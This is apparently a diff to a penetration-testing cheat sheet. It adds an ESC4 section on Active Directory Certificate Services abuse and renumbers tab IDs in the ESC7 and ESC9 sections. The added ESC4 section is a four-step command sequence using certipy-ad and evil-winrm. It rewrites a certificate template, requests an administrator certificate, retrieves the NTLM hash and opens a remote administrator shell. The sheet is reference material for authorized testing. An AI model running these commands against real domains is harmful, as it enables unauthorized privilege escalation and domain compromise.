@@ -310,6 +310,39 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 
 ---
 
+### ESC4
+
+{{< tab set7 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set7 tab1 >}}
+
+#### 1. Update Template
+
+```console
+certipy-ad template -username '<USER>' -hashes '<HASH>' -template '<TEMPLATE>' -target <TARGET> -save-old
+```
+
+#### 2. Request a Cert Based on the ESC4 Template
+
+```console
+certipy-ad req -username '<USER>' -hashes '<HASH>' -template '<TEMPLATE>' -target <TARGET> -ca <CA> -upn administrator@<DOMAIN>
+```
+
+#### 3. Get NTLM Hash
+
+```console
+certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+#### 4. Remote
+
+```console
+evil-winrm -i <TARGET> -u administrator -H <HASH>
+```
+
+{{< /tabcontent >}}
+
+---
+
 ### ESC7
 
 ```console
@@ -323,8 +356,8 @@ impacket-psexec -hashes :<HASH> administrator@<DOMAIN> cmd.exe
 
 <br>
 
-{{< tab set7 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set7 tab1 >}}
+{{< tab set8 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set8 tab1 >}}
 
 #### 1. Use ManageCA Privilege to Add Manage Certificates Permission
 
@@ -374,8 +407,8 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 ### ESC9
 
-{{< tab set8 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set8 tab1 >}}
+{{< tab set9 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set9 tab1 >}}
 
 #### 1. Modify Target User's userPrincipalName (With GenericAll/GenericWrite)
 
